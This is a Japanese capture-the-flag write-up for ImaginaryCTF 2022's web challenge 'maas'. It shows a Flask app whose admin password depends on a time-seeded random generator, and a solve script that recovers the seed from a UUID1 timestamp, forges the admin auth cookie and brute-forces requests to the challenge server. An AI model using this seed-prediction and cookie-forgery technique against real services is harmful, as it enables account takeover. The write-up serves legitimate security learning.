---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: maas
genre: web
solved_date: 2022-07-18
during_ctf: true
tag: [random,uuid]
fav: false
difficulty: easy
---

### 概要

<details><summary>コード</summary>

```py
from flask import Flask, render_template, request, make_response, redirect
from hashlib import sha256
import time
import uuid
import random

app = Flask(__name__)

memes = [l.strip() for l in open("memes.txt").readlines()]
users = {}
taken = []

def adduser(username):
  if username in taken:
    return "username taken", "username taken"
  password = "".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(30)])
  cookie = sha256(password.encode()).hexdigest()
  users[cookie] = {"username": username, "id": str(uuid.uuid1())}
  taken.append(username)
  return cookie, password

@app.route('/')
def index():
    return redirect("/login")

@app.route('/users')
def listusers():
  return render_template('users.html', users=users)

@app.route('/users/<id>')
def getuser(id):
  for k in users.keys():
    if users[k]["id"] == id:
      return f"Under construction.<br><br>User {users[k]['username']} is a very cool user!"

@app.route('/login', methods=['GET', 'POST'])
def login():
  if request.method == "POST":
    resp = make_response(redirect('/home'))
    cookie = sha256(request.form["password"].encode()).hexdigest()
    resp.set_cookie('auth', cookie)
    return resp
  else:
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
  if request.method == "POST":
    cookie, password = adduser(request.form["username"])
    resp = make_response(f"Username: {request.form['username']}<br>Password: {password}")
    resp.set_cookie('auth', cookie)
    return f"Username: {request.form['username']}<br>Password: {password}"
  else:
    return render_template('register.html')

@app.route('/home', methods=['GET'])
def home():
    cookie = request.cookies.get('auth')
    username = users[cookie]["username"]
    if username == 'admin':
        flag = open('flag.txt').read()
        return render_template('home.html', username=username, message=f'Your flag: {flag}', meme=random.choice(memes))
    else:
        return render_template('home.html', username=username, message='Only the admin user can view the flag.', meme=random.choice(memes))

@app.errorhandler(Exception)
def handle_error(e):
    return redirect('/login')

def initialize():
  random.seed(round(time.time(), 2))
  adduser("admin")

initialize()
app.run('0.0.0.0', 8080)
```

</details>


### 解法

UUID1 にはタイムスタンプの情報が載っているので、seed 設定時刻がある程度予測できる。よって、それを探索してパスワードを予測すればよい。

<details><summary>スクリプト</summary>

```py
from time import sleep
import uuid
import random
import uuid
import requests
from hashlib import sha256


target = "5b251698-0596-11ed-b361-4e705681929a"

ts = round((uuid.UUID(target).time - 0x01b21dd213814000) * 100 / 1e9, 2)

for i in range(10 ** 9):
  for d in [i * 0.01, i * -0.01]:
    random.seed(round(ts + d, 2))
    password = "".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(30)])
    cookie = sha256(password.encode()).hexdigest()
    res = requests.get("http://maas.chal.imaginaryctf.org/home", cookies={ "auth": cookie })
    if b"admin" in res.content:
      print(res.content)
      exit(0)
```

</details>

